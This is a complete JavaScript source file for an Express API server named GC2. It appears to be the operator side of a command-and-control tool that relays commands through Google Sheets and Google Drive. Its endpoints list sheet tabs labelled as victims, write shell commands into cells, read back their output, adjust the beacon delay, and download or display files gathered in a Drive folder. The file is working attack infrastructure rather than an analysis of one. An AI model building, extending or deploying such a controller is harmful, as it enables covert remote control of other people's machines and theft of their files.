const express  = require('express');
const cors     = require('cors');
const { google } = require('googleapis');
const fs       = require('fs');
const path     = require('path');
const yaml     = require('js-yaml');

const app = express();
app.use(cors());
app.use(express.json({ limit: '50mb' }));

// ─── Load options.yml ─────────────────────────────────────────────────────────
const OPTIONS_PATH = path.resolve(__dirname, '../cmd/options.yml');

function loadOptions() {
  try {
    const raw = fs.readFileSync(OPTIONS_PATH, 'utf8');
    const doc = yaml.load(raw);
    return {
      commandService:      doc.CommandService      || 'Google',
      fileSystemService:   doc.FileSystemService   || 'Google',
      serviceAccountKey:   doc.GoogleServiceAccountKey || '',
      sheetId:             doc.GoogleSheetID        || '',
      driveId:             doc.GoogleDriveID        || '',
      microsoftTenantId:   doc.MicrosoftTenantID    || '',
      microsoftClientId:   doc.MicrosoftClientID    || '',
      microsoftClientSecret: doc.MicrosoftClientSecret || '',
      microsoftSiteId:     doc.MicrosoftSiteID      || '',
      rowId:               doc.RowId || 1,
      proxy:               doc.Proxy  || null,
      verbose:             doc.Verbose || false,
    };
  } catch (e) {
    console.error('[GC2] Failed to read options.yml:', e.message);
    return {};
  }
}

// ─── Build Google auth client from service account key ────────────────────────
function getAuthClient(keyOverride) {
  const opts = loadOptions();
  const raw  = keyOverride || opts.serviceAccountKey;
  if (!raw) throw new Error('No GoogleServiceAccountKey found in options.yml');
  const credentials = typeof raw === 'string' ? JSON.parse(raw) : raw;
  return new google.auth.GoogleAuth({
    credentials,
    scopes: [
      'https://www.googleapis.com/auth/spreadsheets',
      'https://www.googleapis.com/auth/drive',
      'https://www.googleapis.com/auth/drive.file',
    ],
  });
}

// Helper: merge query/body params with options.yml defaults
function resolveParams(source) {
  const opts = loadOptions();
  return {
    serviceAccountKey: source.serviceAccountKey || opts.serviceAccountKey,
    sheetId:           source.sheetId           || opts.sheetId,
    driveId:           source.driveId           || opts.driveId,
    sheetName:         source.sheetName,
  };
}

// ─── CONFIG ENDPOINT ──────────────────────────────────────────────────────────
// GET /api/config — returns parsed options.yml to the frontend
app.get('/api/config', (req, res) => {
  try {
    const opts = loadOptions();
    // Never expose the raw private key to the browser — only signal it's set
    res.json({
      commandService:    opts.commandService,
      fileSystemService: opts.fileSystemService,
      sheetId:           opts.sheetId,
      driveId:           opts.driveId,
      rowId:             opts.rowId,
      verbose:           opts.verbose,
      hasServiceAccount: !!opts.serviceAccountKey,
      // MS fields
      hasMicrosoft: !!(opts.microsoftTenantId && opts.microsoftClientId),
    });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// POST /api/config — update options.yml from browser
app.post('/api/config', (req, res) => {
  try {
    const raw = fs.readFileSync(OPTIONS_PATH, 'utf8');
    const doc = yaml.load(raw) || {};
    const b   = req.body;

    if (b.sheetId)           doc.GoogleSheetID            = b.sheetId;
    if (b.driveId)           doc.GoogleDriveID            = b.driveId;
    if (b.serviceAccountKey) doc.GoogleServiceAccountKey  = b.serviceAccountKey;

    fs.writeFileSync(OPTIONS_PATH, yaml.dump(doc), 'utf8');
    res.json({ success: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ─── SHEETS ───────────────────────────────────────────────────────────────────

// GET /api/sheets/tabs — list all sheet tabs (victims)
app.get('/api/sheets/tabs', async (req, res) => {
  try {
    const p      = resolveParams(req.query);
    const auth   = getAuthClient(p.serviceAccountKey);
    const sheets = google.sheets({ version: 'v4', auth });
    const resp   = await sheets.spreadsheets.get({ spreadsheetId: p.sheetId });
    const tabs   = resp.data.sheets.map(s => ({
      id:    s.properties.sheetId,
      title: s.properties.title,
      index: s.properties.index,
    }));
    res.json({ tabs });
  } catch (e) {
    console.error(e.message);
    res.status(500).json({ error: e.message });
  }
});

// GET /api/sheets/rows?sheetName=...
app.get('/api/sheets/rows', async (req, res) => {
  try {
    const p      = resolveParams(req.query);
    const auth   = getAuthClient(p.serviceAccountKey);
    const sheets = google.sheets({ version: 'v4', auth });
    const range  = `${p.sheetName}!A1:E200`;
    const resp   = await sheets.spreadsheets.values.get({
      spreadsheetId: p.sheetId,
      range,
    });
    const rows = (resp.data.values || []).map((row, i) => ({
      rowIndex:   i + 1,
      command:    row[0] || '',
      output:     row[1] || '',
      timestamp:  row[2] || '',
      delayLabel: row[3] || '',
      delayValue: row[4] || '',
    }));
    res.json({ rows });
  } catch (e) {
    console.error(e.message);
    res.status(500).json({ error: e.message });
  }
});

// POST /api/sheets/command
app.post('/api/sheets/command', async (req, res) => {
  try {
    const p      = resolveParams(req.body);
    const auth   = getAuthClient(p.serviceAccountKey);
    const sheets = google.sheets({ version: 'v4', auth });
    const range  = `${req.body.sheetName}!A${req.body.rowIndex}`;
    await sheets.spreadsheets.values.update({
      spreadsheetId: p.sheetId,
      range,
      valueInputOption: 'RAW',
      requestBody: { values: [[req.body.command]] },
    });
    res.json({ success: true });
  } catch (e) {
    console.error(e.message);
    res.status(500).json({ error: e.message });
  }
});

// GET /api/sheets/ticker?sheetName=...
app.get('/api/sheets/ticker', async (req, res) => {
  try {
    const p      = resolveParams(req.query);
    const auth   = getAuthClient(p.serviceAccountKey);
    const sheets = google.sheets({ version: 'v4', auth });
    const resp   = await sheets.spreadsheets.values.get({
      spreadsheetId: p.sheetId,
      range: `${req.query.sheetName}!E2`,
    });
    res.json({ ticker: parseInt(resp.data.values?.[0]?.[0] || '60', 10) });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// POST /api/sheets/ticker
app.post('/api/sheets/ticker', async (req, res) => {
  try {
    const p      = resolveParams(req.body);
    const auth   = getAuthClient(p.serviceAccountKey);
    const sheets = google.sheets({ version: 'v4', auth });
    await sheets.spreadsheets.values.update({
      spreadsheetId: p.sheetId,
      range: `${req.body.sheetName}!E2`,
      valueInputOption: 'RAW',
      requestBody: { values: [[String(req.body.ticker)]] },
    });
    res.json({ success: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ─── DRIVE ────────────────────────────────────────────────────────────────────

// GET /api/drive/files
app.get('/api/drive/files', async (req, res) => {
  try {
    const p    = resolveParams(req.query);
    const auth = getAuthClient(p.serviceAccountKey);
    const drive = google.drive({ version: 'v3', auth });
    const resp  = await drive.files.list({
      q:       `'${p.driveId}' in parents and trashed=false`,
      fields:  'files(id,name,mimeType,size,modifiedTime)',
      orderBy: 'modifiedTime desc',
    });
    res.json({ files: resp.data.files || [] });
  } catch (e) {
    console.error(e.message);
    res.status(500).json({ error: e.message });
  }
});

// GET /api/drive/download/:fileId
app.get('/api/drive/download/:fileId', async (req, res) => {
  try {
    const p    = resolveParams(req.query);
    const auth = getAuthClient(p.serviceAccountKey);
    const drive = google.drive({ version: 'v3', auth });
    const meta  = await drive.files.get({ fileId: req.params.fileId, fields: 'name,mimeType' });
    res.setHeader('Content-Disposition', `attachment; filename="${meta.data.name}"`);
    res.setHeader('Content-Type', meta.data.mimeType);
    const file  = await drive.files.get(
      { fileId: req.params.fileId, alt: 'media' },
      { responseType: 'stream' }
    );
    file.data.pipe(res);
  } catch (e) {
    console.error(e.message);
    res.status(500).json({ error: e.message });
  }
});

// GET /api/drive/view/:fileId
app.get('/api/drive/view/:fileId', async (req, res) => {
  try {
    const p    = resolveParams(req.query);
    const auth = getAuthClient(p.serviceAccountKey);
    const drive = google.drive({ version: 'v3', auth });
    const meta  = await drive.files.get({ fileId: req.params.fileId, fields: 'name,mimeType,size' });
    const file  = await drive.files.get(
      { fileId: req.params.fileId, alt: 'media' },
      { responseType: 'arraybuffer' }
    );
    const buf    = Buffer.from(file.data);
    const isText = meta.data.mimeType?.startsWith('text') ||
                   /\.(txt|log|md|csv|json|xml|sh|bat|ps1|py|js|go)$/i.test(meta.data.name || '');
    res.json({
      name:    meta.data.name,
      mimeType: meta.data.mimeType,
      size:    meta.data.size,
      content: isText ? buf.toString('utf-8') : buf.toString('base64'),
      isText,
    });
  } catch (e) {
    console.error(e.message);
    res.status(500).json({ error: e.message });
  }
});

// ─── Start ────────────────────────────────────────────────────────────────────
const PORT = process.env.PORT || 3001;
app.listen(PORT, () => {
  const opts = loadOptions();
  console.log(`GC2 API Server → http://localhost:${PORT}`);
  console.log(`  Config file  → ${OPTIONS_PATH}`);
  console.log(`  Sheet ID     → ${opts.sheetId || '(not set)'}`);
  console.log(`  Drive ID     → ${opts.driveId || '(not set)'}`);
  console.log(`  Service Acct → ${opts.serviceAccountKey ? '✓ loaded' : '✗ MISSING'}`);
});
